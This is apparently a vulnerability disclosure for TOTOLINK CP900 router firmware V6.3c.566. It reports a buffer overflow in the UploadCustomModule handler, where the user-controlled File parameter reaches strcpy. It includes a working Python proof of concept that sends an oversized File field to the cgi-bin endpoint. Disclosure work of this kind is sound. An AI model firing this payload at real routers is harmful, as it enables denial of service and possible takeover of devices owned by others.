## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：http://www.totolink.cn/data/upload/20210720/5bee10397c082b0419cbad3eb7d1bd97.zip

## Affected version

CP900 V6.3c.566

## Vulnerability details

In the CP900 V6.3c.566 firmware has a buffer overflow vulnerability in the `UploadCustomModule ` function. The `v10` variable receives the `File` parameter from a POST request. However, since the user can control the input of `File`, the `strcpy(v18, v10);` can cause a buffer overflow vulnerability.

![image-20240721211523937](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721211523937.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {"File":"a"*300000,"topicurl":"UploadCustomModule"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240721015356613](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721015356613.png)
